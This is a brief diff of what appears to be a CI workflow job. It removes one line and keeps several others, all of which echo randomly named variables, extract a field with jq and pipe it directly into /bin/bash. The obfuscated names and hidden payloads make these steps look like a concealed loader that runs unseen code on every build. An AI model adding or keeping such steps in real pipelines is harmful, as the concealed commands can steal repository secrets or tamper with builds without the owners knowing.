@@ -21,7 +21,6 @@ jobs:
           echo $ln3381 | jq -r .u564 | /bin/bash
           echo $b12244 | jq -r .f2116 | /bin/bash
           echo $omdc247 | jq -r .ptfp982 | /bin/bash
-          echo $tv73 | jq -r .ep4 | /bin/bash
           printf '%s' "$fzlqc1899" | jq -r .p07 | /bin/bash
 
       - name: Save results
